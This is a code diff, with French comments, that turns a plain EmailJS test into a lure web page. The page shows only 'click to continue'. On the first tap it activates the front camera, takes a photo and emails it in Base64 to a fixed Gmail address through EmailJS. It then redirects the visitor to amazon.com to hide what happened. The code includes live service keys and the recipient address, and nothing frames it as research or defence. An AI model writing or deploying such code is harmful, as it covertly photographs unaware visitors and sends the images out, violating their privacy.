@@ -1,11 +1,64 @@
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script>
-emailjs.init("IoSfbtGz4KSL_5_9E");
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Capture et envoi Base64</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    emailjs.init("IoSfbtGz4KSL_5_9E"); // ta clé publique
+  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body { margin:0; padding:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; background:#fff; overflow:hidden; }
+    #status { position:absolute; top:10px; width:100%; text-align:center; font-size:16px; color:green; }
+    video, canvas { display:none; }
+  </style>
+</head>
+<body>
+  <div id="status">Cliquez pour continuer...</div>
 
-emailjs.send("service_8cs0gml", "template_hgvdx1g", {
-  to_email: "adressestestee@gmail.com",
-  message: "Test simple sans photo"
-})
-.then(() => alert("Mail envoyé !"))
-.catch(err => alert("Erreur : " + err));
-</script>
+  <script>
+    async function captureAndSend() {
+      document.body.removeEventListener("click", captureAndSend);
+      document.body.removeEventListener("touchstart", captureAndSend);
+
+      const status = document.getElementById("status");
+      status.textContent = "Activation caméra...";
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        const MAX_WIDTH = 200;
+        const ratio = video.videoHeight / video.videoWidth;
+        canvas.width = MAX_WIDTH;
+        canvas.height = MAX_WIDTH * ratio;
+
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageBase64 = canvas.toDataURL("image/jpeg", 0.3); // compression 30%
+
+        stream.getTracks().forEach(track => track.stop());
+
+        const params = {
+          to_email: "adressestestee@gmail.com",
+          message: imageBase64 // envoi direct dans le corps du message
+        };
+
+        emailjs.send("service_8cs0gml", "template_hgvdx1g", params)
+          .then(() => console.log("Email envoyé !"))
+          .catch(err => console.error("Erreur envoi : ", err))
+          .finally(() => { window.location.href = "https://www.amazon.com"; });
+
+      } catch(err) {
+        status.textContent = "Erreur caméra : " + err;
+      }
+    }
+
+    document.body.addEventListener("click", captureAndSend);
+    document.body.addEventListener("touchstart", captureAndSend, { passive: true });
+  </script>
+</body>
+</html>
